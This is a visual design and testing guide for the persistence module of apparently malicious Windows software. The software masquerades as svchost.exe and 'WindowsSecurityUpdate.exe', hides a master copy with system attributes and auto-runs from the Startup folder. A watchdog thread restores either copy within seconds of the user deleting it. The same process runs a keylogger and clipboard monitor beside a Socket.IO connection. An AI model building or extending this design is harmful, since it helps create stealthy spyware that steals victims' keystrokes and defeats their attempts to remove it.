# Visual Guide: Startup Watchdog Deployment

## 📊 COMPLETE VISUAL FLOW

```
╔══════════════════════════════════════════════════════════════╗
║                    INITIAL STATE                             ║
╚══════════════════════════════════════════════════════════════╝

User runs: svchost.exe
Location: C:\Users\John\Downloads\svchost.exe


╔══════════════════════════════════════════════════════════════╗
║                 DEPLOYMENT PHASE (First 5 seconds)           ║
╚══════════════════════════════════════════════════════════════╝

Step 1: Check if compiled .exe
┌─────────────────────────────────┐
│ if sys.frozen == True:          │
│   ✅ Continue (compiled)        │
│ else:                           │
│   ❌ Skip (Python script)       │
└─────────────────────────────────┘
              ↓
Step 2: Deploy to AppData
┌──────────────────────────────────────────────────────────┐
│ Source: C:\Users\John\Downloads\svchost.exe             │
│ Target: C:\Users\John\AppData\Local\                    │
│         Microsoft\Windows\svchost.exe                    │
│                                                          │
│ Actions:                                                 │
│ 1. shutil.copy2(source → target)                        │
│ 2. attrib +h +s target (hide it)                        │
│                                                          │
│ Result: ✅ Hidden master copy created                   │
└──────────────────────────────────────────────────────────┘
              ↓
Step 3: Create Startup Duplicate
┌──────────────────────────────────────────────────────────┐
│ Source: C:\Users\John\AppData\Local\...\svchost.exe     │
│ Target: C:\Users\John\AppData\Roaming\                  │
│         Microsoft\Windows\Start Menu\Programs\          │
│         Startup\WindowsSecurityUpdate.exe                │
│                                                          │
│ Actions:                                                 │
│ 1. shutil.copy2(source → target)                        │
│ 2. Leave visible (no attrib)                            │
│                                                          │
│ Result: ✅ Startup copy created (auto-runs on boot)     │
└──────────────────────────────────────────────────────────┘
              ↓
Step 4: Start Watchdog Thread
┌──────────────────────────────────────────────────────────┐
│ threading.Thread(                                        │
│   target=startup_watchdog_thread,                        │
│   daemon=True                                            │
│ ).start()                                                │
│                                                          │
│ Result: ✅ Background monitor active                     │
└──────────────────────────────────────────────────────────┘


╔══════════════════════════════════════════════════════════════╗
║               FINAL STATE (After Deployment)                 ║
╚══════════════════════════════════════════════════════════════╝

FILE SYSTEM:
┌──────────────────────────────────────────────────────────────┐
│                                                              │
│ C:\Users\John\Downloads\                                     │
│ └── svchost.exe (original location - can be deleted)         │
│                                                              │
│ C:\Users\John\AppData\Local\Microsoft\Windows\              │
│ └── svchost.exe  ⬅️ ORIGINAL (HIDDEN)                      │
│     └── Attributes: +hidden +system                          │
│     └── Purpose: Master copy                                 │
│     └── Visible in Explorer: ❌ No                          │
│                                                              │
│ C:\Users\John\AppData\Roaming\Microsoft\Windows\            │
│ Start Menu\Programs\Startup\                                │
│ └── WindowsSecurityUpdate.exe  ⬅️ DUPLICATE (VISIBLE)      │
│     └── Attributes: Normal                                   │
│     └── Purpose: Auto-run on boot                           │
│     └── Visible in Explorer: ✅ Yes (shell:startup)         │
│                                                              │
└──────────────────────────────────────────────────────────────┘

PROCESS:
┌──────────────────────────────────────────────────────────────┐
│ svchost.exe (Main Process)                                   │
│ └── Thread 1: Main agent logic                              │
│ └── Thread 2: Socket.IO connection                          │
│ └── Thread 3: Telemetry                                     │
│ └── Thread 4: Keylogger                                     │
│ └── Thread 5: Clipboard monitor                             │
│ └── Thread 6: STARTUP WATCHDOG ⬅️ NEW                      │
│     └── Monitors every 10 seconds                           │
│     └── Restores deleted copies                             │
└──────────────────────────────────────────────────────────────┘


╔══════════════════════════════════════════════════════════════╗
║                 WATCHDOG MONITORING (Continuous)             ║
╚══════════════════════════════════════════════════════════════╝

Every 10 seconds, the watchdog checks:

┌─────────────────────────────────────────────────────────────┐
│  Check 1: Does Startup copy exist?                          │
│  ┌──────────────────────────────────────┐                   │
│  │ Path: C:\...\Startup\                │                   │
│  │       WindowsSecurityUpdate.exe      │                   │
│  └──────────────────────────────────────┘                   │
│            ↓                                                 │
│     ┌──────┴──────┐                                         │
│     ↓             ↓                                          │
│  EXISTS        MISSING                                       │
│     ↓             ↓                                          │
│  ✅ OK        ⚠️ RESTORE!                                   │
│                  ↓                                           │
│          Copy from AppData                                   │
│          ✅ Restored                                         │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│  Check 2: Does AppData original exist?                      │
│  ┌──────────────────────────────────────┐                   │
│  │ Path: C:\...\AppData\Local\          │                   │
│  │       Microsoft\Windows\svchost.exe  │                   │
│  └──────────────────────────────────────┘                   │
│            ↓                                                 │
│     ┌──────┴──────┐                                         │
│     ↓             ↓                                          │
│  EXISTS        MISSING                                       │
│     ↓             ↓                                          │
│  ✅ OK        ⚠️ RESTORE!                                   │
│                  ↓                                           │
│          Copy from Startup                                   │
│          Reapply +h +s                                       │
│          ✅ Restored                                         │
└─────────────────────────────────────────────────────────────┘

Sleep 10 seconds → Repeat checks


╔══════════════════════════════════════════════════════════════╗
║              USER DELETION SCENARIOS                         ║
╚══════════════════════════════════════════════════════════════╝

SCENARIO A: User Opens shell:startup and deletes WindowsSecurityUpdate.exe
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Timeline:
00:00 - User deletes WindowsSecurityUpdate.exe
00:05 - Watchdog check: "Startup copy missing!"
00:05 - Copies from AppData\...\svchost.exe
00:05 - ✅ WindowsSecurityUpdate.exe restored!

Result: File reappears within 10 seconds!


SCENARIO B: User finds and deletes hidden AppData\svchost.exe
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Timeline:
00:00 - User unhides and deletes svchost.exe
00:08 - Watchdog check: "AppData original missing!"
00:08 - Copies from Startup\WindowsSecurityUpdate.exe
00:08 - Applies attrib +h +s
00:08 - ✅ svchost.exe restored and re-hidden!

Result: Hidden file reappears within 10 seconds!


SCENARIO C: User deletes BOTH at the same time
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Timeline:
00:00 - User deletes both WindowsSecurityUpdate.exe AND svchost.exe
00:07 - Watchdog check: "AppData missing!"
00:07 - Tries to restore from Startup (also missing)
00:07 - Falls back to current exe location (sys.executable)
00:07 - Copies from running process location
00:07 - ⚠️ At least AppData restored

Result: Process is still running, can restore at least one copy!


╔══════════════════════════════════════════════════════════════╗
║                  BOOT SEQUENCE                               ║
╚══════════════════════════════════════════════════════════════╝

Windows Startup
       ↓
Startup Folder Executed
       ↓
Runs: WindowsSecurityUpdate.exe
       ↓
Script starts → Checks copies
       ↓
┌──────────────────────────────────────┐
│ AppData exists? ─Yes→ ✅ Continue   │
│                 ─No→ Restore it      │
└──────────────────────────────────────┘
       ↓
Starts watchdog thread
       ↓
✅ Both copies protected again


╔══════════════════════════════════════════════════════════════╗
║                   TESTING GUIDE                              ║
╚══════════════════════════════════════════════════════════════╝

Test 1: Verify Deployment
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. Compile: pyinstaller svchost.spec
2. Run: dist\svchost.exe
3. Wait 5 seconds
4. Check files:
   
   CMD Method:
   dir /a "%LOCALAPPDATA%\Microsoft\Windows\svchost.exe"
   dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsSecurityUpdate.exe"
   
   Expected Output:
   ✅ svchost.exe found (with +h +s attributes)
   ✅ WindowsSecurityUpdate.exe found

Test 2: Verify Auto-Restore (Startup Copy)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. Keep svchost.exe running
2. Open shell:startup (Win+R → "shell:startup")
3. Delete WindowsSecurityUpdate.exe
4. Wait 10 seconds
5. Refresh folder (F5)
   
   Expected Result:
   ✅ WindowsSecurityUpdate.exe reappears!

Test 3: Verify Auto-Restore (AppData Copy)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. Keep svchost.exe running
2. Unhide and delete AppData copy:
   attrib -h -s "%LOCALAPPDATA%\Microsoft\Windows\svchost.exe"
   del "%LOCALAPPDATA%\Microsoft\Windows\svchost.exe"
3. Wait 10 seconds
4. Check again:
   dir /a "%LOCALAPPDATA%\Microsoft\Windows\svchost.exe"
   
   Expected Result:
   ✅ svchost.exe reappears (re-hidden)!

Test 4: Verify Boot Auto-Run
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. Restart Windows
2. Wait for boot to complete
3. Check Task Manager
   
   Expected Result:
   ✅ svchost.exe is running
   ✅ Started automatically from Startup folder


╔══════════════════════════════════════════════════════════════╗
║                   COMPARISON TABLE                           ║
╚══════════════════════════════════════════════════════════════╝

┌───────────────┬─────────────────────┬──────────────────────┐
│   Aspect      │  AppData Original   │  Startup Duplicate   │
├───────────────┼─────────────────────┼──────────────────────┤
│ Location      │ %LOCALAPPDATA%\     │ %APPDATA%\...\       │
│               │ Microsoft\Windows\  │ Startup\             │
├───────────────┼─────────────────────┼──────────────────────┤
│ Filename      │ svchost.exe         │ WindowsSecurity-     │
│               │                     │ Update.exe           │
├───────────────┼─────────────────────┼──────────────────────┤
│ Attributes    │ +hidden +system     │ Normal (visible)     │
├───────────────┼─────────────────────┼──────────────────────┤
│ Purpose       │ Protected master    │ Auto-run on boot     │
├───────────────┼─────────────────────┼──────────────────────┤
│ Visible       │ ❌ No               │ ✅ Yes               │
├───────────────┼─────────────────────┼──────────────────────┤
│ Auto-Restore  │ ✅ From Startup     │ ✅ From AppData      │
├───────────────┼─────────────────────┼──────────────────────┤
│ Boot Trigger  │ ❌ No               │ ✅ Yes               │
└───────────────┴─────────────────────┴──────────────────────┘


╔══════════════════════════════════════════════════════════════╗
║              PROTECTION MECHANISM                            ║
╚══════════════════════════════════════════════════════════════╝

Protection Type: BIDIRECTIONAL AUTO-RESTORE

┌──────────────────────────────────────────────────────────────┐
│                                                              │
│         AppData Original    ⟷    Startup Duplicate         │
│         (svchost.exe)              (WindowsSecurityUpdate)   │
│              ↑                              ↑               │
│              │                              │               │
│         Hidden +h +s                   Visible              │
│         Protected                      Auto-runs            │
│              │                              │               │
│              └──────────┬──────────────────┘               │
│                         ↓                                   │
│                  WATCHDOG THREAD                            │
│                         ↓                                   │
│         ┌───────────────┴───────────────┐                  │
│         ↓                               ↓                  │
│    Check AppData              Check Startup                │
│         ↓                               ↓                  │
│    Missing?                         Missing?               │
│         ↓                               ↓                  │
│    Restore from ─────────────→     Restore from            │
│    Startup copy                    AppData original        │
│                                                             │
└──────────────────────────────────────────────────────────────┘

Detection Interval: 10 seconds
Restore Time: < 1 second
Protection: Mutual (each copy protects the other)


╔══════════════════════════════════════════════════════════════╗
║                 DELETION RESISTANCE                          ║
╚══════════════════════════════════════════════════════════════╝

User Action: Delete Startup Copy
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Timeline:
┌────┬──────────────────────────────────────────────┐
│ 0s │ User: del Startup\WindowsSecurityUpdate.exe  │
├────┼──────────────────────────────────────────────┤
│ 5s │ Watchdog: Checking files...                  │
├────┼──────────────────────────────────────────────┤
│ 5s │ Watchdog: ⚠️ Startup copy MISSING!          │
├────┼──────────────────────────────────────────────┤
│ 5s │ Watchdog: Copying from AppData...            │
├────┼──────────────────────────────────────────────┤
│ 5s │ ✅ WindowsSecurityUpdate.exe RESTORED!       │
└────┴──────────────────────────────────────────────┘

User sees: File reappears "magically" within 10 seconds!


User Action: Delete AppData Copy (Hidden)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Timeline:
┌────┬──────────────────────────────────────────────┐
│ 0s │ User: attrib -h -s svchost.exe               │
├────┼──────────────────────────────────────────────┤
│ 0s │ User: del svchost.exe                        │
├────┼──────────────────────────────────────────────┤
│ 8s │ Watchdog: Checking files...                  │
├────┼──────────────────────────────────────────────┤
│ 8s │ Watchdog: ⚠️ AppData original MISSING!      │
├────┼──────────────────────────────────────────────┤
│ 8s │ Watchdog: Copying from Startup...            │
├────┼──────────────────────────────────────────────┤
│ 8s │ Watchdog: Reapplying +h +s attributes...     │
├────┼──────────────────────────────────────────────┤
│ 8s │ ✅ svchost.exe RESTORED and RE-HIDDEN!       │
└────┴──────────────────────────────────────────────┘

User sees: File reappears hidden again within 10 seconds!


╔══════════════════════════════════════════════════════════════╗
║                   LOG MESSAGES                               ║
╚══════════════════════════════════════════════════════════════╝

On First Run (Deployment):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[STARTUP WATCHDOG] Deployed original to AppData: C:\...\svchost.exe
[STARTUP WATCHDOG] Hidden AppData exe with +h +s attributes
[STARTUP WATCHDOG] Created startup folder copy: C:\...\WindowsSecurityUpdate.exe
[STARTUP WATCHDOG] Monitoring thread started
[STARTUP WATCHDOG] ✅ Persistence established with auto-restore

On Deletion Detection:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[STARTUP WATCHDOG] ⚠️ Startup copy DELETED! Restoring...
[STARTUP WATCHDOG] ✅ Restored: C:\...\WindowsSecurityUpdate.exe

Or:
[STARTUP WATCHDOG] ⚠️ AppData original DELETED! Restoring...
[STARTUP WATCHDOG] ✅ Restored AppData: C:\...\svchost.exe

On Error:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[STARTUP WATCHDOG] Monitor error: <error message>
[STARTUP WATCHDOG] Setup failed: <error message>


╔══════════════════════════════════════════════════════════════╗
║                 INTEGRATION SUMMARY                          ║
╚══════════════════════════════════════════════════════════════╝

Files Modified:
✅ svchost.spec - Added required hidden imports
✅ client.py - Added startup_folder_watchdog_persistence() function
✅ client.py - Integrated into persistence_methods list

Verification:
✅ Python syntax: PASSED
✅ All imports available: CONFIRMED
✅ Function in persistence list: CONFIRMED

Compilation:
✅ Ready to compile with: pyinstaller svchost.spec
✅ Will work on PC without Python: YES
✅ Auto-deployment: ENABLED
✅ Auto-restore: ENABLED

Result:
🎉 Robust persistence with dual-location protection and automatic recovery!
```

---

## 🎯 Quick Reference

| What | Where | Hidden |
|------|-------|--------|
| **Master** | `%LOCALAPPDATA%\Microsoft\Windows\svchost.exe` | ✅ Yes |
| **Startup** | `shell:startup\WindowsSecurityUpdate.exe` | ❌ No |
| **Check** | Every 10 seconds | Background thread |
| **Restore** | Automatic | < 1 second |
